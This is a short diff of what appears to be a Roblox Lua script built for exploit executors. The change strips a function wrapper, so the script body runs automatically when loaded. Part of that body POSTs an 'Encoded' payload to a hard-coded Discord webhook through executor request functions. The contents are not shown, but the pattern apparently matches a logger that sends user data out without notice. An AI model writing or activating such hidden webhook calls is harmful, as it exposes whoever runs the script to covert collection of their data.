@@ -1,4 +1,4 @@
-local function createArabicVersion()
+
 wait(1)
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -10207,5 +10207,4 @@ local WebhookURL = "https://discord.com/api/webhooks/1361944409662423180/cliAsM5
 local Request = http_request or request or HttpPost or syn.request
 if Request then
     Request({Url = WebhookURL, Body = Encoded, Method = "POST", Headers = Headers})
-end
 end
